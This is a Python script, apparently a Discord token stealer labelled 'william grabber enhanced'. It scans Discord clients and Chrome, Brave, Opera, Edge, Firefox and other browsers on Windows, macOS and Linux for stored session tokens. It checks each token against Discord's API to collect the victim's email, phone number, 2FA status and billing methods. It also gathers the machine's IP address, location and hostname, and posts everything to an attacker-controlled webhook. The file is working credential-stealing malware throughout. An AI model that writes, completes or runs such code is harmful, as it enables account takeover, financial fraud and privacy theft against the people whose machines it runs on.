import os
import json
import re
import platform
import socket
import getpass
import requests
import subprocess
from pathlib import Path
from datetime import datetime

WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

def get_system_info():
    try:
        public_ip = requests.get("https://api.ipify.org").text.strip()
    except:
        public_ip = "unknown"
    
    try:
        geo = requests.get(f"https://ipinfo.io/{public_ip}/json").json()
        location = f"{geo.get('city', '?')}, {geo.get('region', '?')}, {geo.get('country', '?')}"
        isp = geo.get("org", "unknown")
    except:
        location = "unknown"
        isp = "unknown"

    return {
        "os": platform.system() + " " + platform.release(),
        "hostname": socket.gethostname(),
        "username": getpass.getuser(),
        "public_ip": public_ip,
        "location": location,
        "isp": isp,
        "cpu": platform.processor(),
        "machine": platform.machine(),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }


def get_paths():
    system = platform.system()
    paths = {}

    if system == "Windows":
        local = os.getenv("LOCALAPPDATA", "")
        roaming = os.getenv("APPDATA", "")
        paths = {
            "Discord":          roaming + r"\Discord",
            "Discord Canary":   roaming + r"\discordcanary",
            "Discord PTB":      roaming + r"\discordptb",
            "Discord Dev":      roaming + r"\discorddevelopment",
            "Chrome":           local + r"\Google\Chrome\User Data\Default",
            "Chrome Beta":      local + r"\Google\Chrome Beta\User Data\Default",
            "Opera":            roaming + r"\Opera Software\Opera Stable",
            "Opera GX":         roaming + r"\Opera Software\Opera GX Stable",
            "Brave":            local + r"\BraveSoftware\Brave-Browser\User Data\Default",
            "Edge":             local + r"\Microsoft\Edge\User Data\Default",
            "Yandex":           local + r"\Yandex\YandexBrowser\User Data\Default",
            "Vivaldi":          local + r"\Vivaldi\User Data\Default",
            "Firefox":          roaming + r"\Mozilla\Firefox\Profiles",
            "Lightcord":        roaming + r"\Lightcord",
            "Vesktop":          roaming + r"\vesktop",
        }
    elif system == "Darwin":
        home = str(Path.home())
        paths = {
            "Discord":  home + "/Library/Application Support/discord",
            "Chrome":   home + "/Library/Application Support/Google/Chrome/Default",
            "Brave":    home + "/Library/Application Support/BraveSoftware/Brave-Browser/Default",
            "Opera":    home + "/Library/Application Support/com.operasoftware.Opera",
            "Firefox":  home + "/Library/Application Support/Firefox/Profiles",
            "Vesktop":  home + "/Library/Application Support/vesktop",
        }
    else:
        home = str(Path.home())
        paths = {
            "Discord":  home + "/.config/discord",
            "Chrome":   home + "/.config/google-chrome/Default",
            "Brave":    home + "/.config/BraveSoftware/Brave-Browser/Default",
            "Opera":    home + "/.config/opera",
            "Firefox":  home + "/.mozilla/firefox",
            "Vesktop":  home + "/.config/vesktop",
        }

    return paths


def get_tokens():
    tokens = []
    token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}"
    paths = get_paths()

    for platform_name, path in paths.items():
        # leveldb (most clients)
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if os.path.exists(leveldb_path):
            for file_name in os.listdir(leveldb_path):
                if not file_name.endswith((".log", ".ldb")):
                    continue
                try:
                    with open(os.path.join(leveldb_path, file_name), errors="ignore") as f:
                        for line in f:
                            for token in re.findall(token_regex, line.strip()):
                                tokens.append((platform_name, token))
                except Exception:
                    continue

        # firefox profiles
        if "Firefox" in platform_name and os.path.exists(path):
            try:
                for profile in os.listdir(path):
                    profile_path = os.path.join(path, profile, "storage", "default")
                    if not os.path.exists(profile_path):
                        continue
                    for root, dirs, files in os.walk(profile_path):
                        for file in files:
                            try:
                                with open(os.path.join(root, file), errors="ignore") as f:
                                    for line in f:
                                        for token in re.findall(token_regex, line.strip()):
                                            tokens.append((platform_name, token))
                            except:
                                continue
            except:
                pass

    return tokens


def validate_token(token):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=5)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None


def get_billing(token):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers, timeout=5)
        if r.status_code == 200:
            sources = r.json()
            if sources:
                types = []
                for s in sources:
                    t = s.get("type")
                    if t == 1:
                        types.append("💳 Credit Card")
                    elif t == 2:
                        types.append("🅿️ PayPal")
                    else:
                        types.append("❓ Unknown")
                return ", ".join(types)
            return "none"
    except:
        pass
    return "unknown"


def get_guilds(token):
    headers = {"Authorization": token}
    try:
        r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers, timeout=5)
        if r.status_code == 200:
            guilds = r.json()
            return f"{len(guilds)} servers"
    except:
        pass
    return "unknown"


def get_nitro(user_info):
    nitro_type = user_info.get("premium_type", 0)
    types = {0: "❌ None", 1: "🟣 Nitro Classic", 2: "🟦 Nitro", 3: "🟡 Nitro Basic"}
    return types.get(nitro_type, "unknown")


def send_to_webhook(token, user_info, platform_name, sys_info):
    valid = user_info is not None

    if valid:
        username = f"{user_info.get('username')}#{user_info.get('discriminator', '0')}"
        user_id = user_info.get("id", "-")
        email = user_info.get("email", "none")
        phone = user_info.get("phone") or "none"
        nitro = get_nitro(user_info)
        billing = get_billing(token)
        guilds = get_guilds(token)
        mfa = "✅" if user_info.get("mfa_enabled") else "❌"
        verified = "✅" if user_info.get("verified") else "❌"
        avatar_id = user_info.get("avatar")
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png" if avatar_id else None
    else:
        username = "Invalid Token"
        user_id = email = phone = nitro = billing = guilds = mfa = verified = "-"
        avatar_url = None

    embed = {
        "embeds": [
            {
                "title": "🔑 Token Captured",
                "color": 0x5865F2 if valid else 0xFF0000,
                "thumbnail": {"url": avatar_url} if avatar_url else {},
                "fields": [
                    {"name": "👤 Username",   "value": username,      "inline": True},
                    {"name": "🆔 User ID",    "value": user_id,       "inline": True},
                    {"name": "📧 Email",      "value": email,         "inline": True},
                    {"name": "📱 Phone",      "value": phone,         "inline": True},
                    {"name": "🔐 2FA",        "value": mfa,           "inline": True},
                    {"name": "✔️ Verified",   "value": verified,      "inline": True},
                    {"name": "💎 Nitro",      "value": nitro,         "inline": True},
                    {"name": "💰 Billing",    "value": billing,       "inline": True},
                    {"name": "🏠 Servers",    "value": guilds,        "inline": True},
                    {"name": "📦 Platform",   "value": platform_name, "inline": True},
                    {"name": "🔑 Token",      "value": f"```{token}```", "inline": False},
                    {"name": "━━━━━━━━━━━━━━━ SYSTEM ━━━━━━━━━━━━━━━", "value": "\u200b", "inline": False},
                    {"name": "🖥️ OS",         "value": sys_info["os"],        "inline": True},
                    {"name": "👤 User",       "value": sys_info["username"],   "inline": True},
                    {"name": "💻 Host",       "value": sys_info["hostname"],   "inline": True},
                    {"name": "🌐 Public IP",  "value": sys_info["public_ip"],  "inline": True},
                    {"name": "📍 Location",   "value": sys_info["location"],   "inline": True},
                    {"name": "🏢 ISP",        "value": sys_info["isp"],        "inline": True},
                    {"name": "🕐 Time",       "value": sys_info["time"],       "inline": True},
                ],
                "footer": {"text": "william grabber enhanced"},
                "timestamp": datetime.utcnow().isoformat(),
            }
        ]
    }

    try:
        requests.post(WEBHOOK_URL, json=embed, timeout=5)
    except:
        pass


def main():
    print("[william] scanning paths...")
    sys_info = get_system_info()
    print(f"[william] system: {sys_info['os']} | ip: {sys_info['public_ip']}")

    found = get_tokens()
    if not found:
        print("[william] no tokens found anywhere")
        return

    seen = set()
    count = 0
    for platform_name, token in found:
        if token in seen:
            continue
        seen.add(token)
        print(f"[william] validating token from {platform_name}...")
        user_info = validate_token(token)
        send_to_webhook(token, user_info, platform_name, sys_info)
        label = user_info.get("username") if user_info else "invalid"
        print(f"[+] {platform_name} -> {label} -> sent")
        count += 1

    print(f"[william] done. {count} token(s) processed.")


if __name__ == "__main__":
    main()
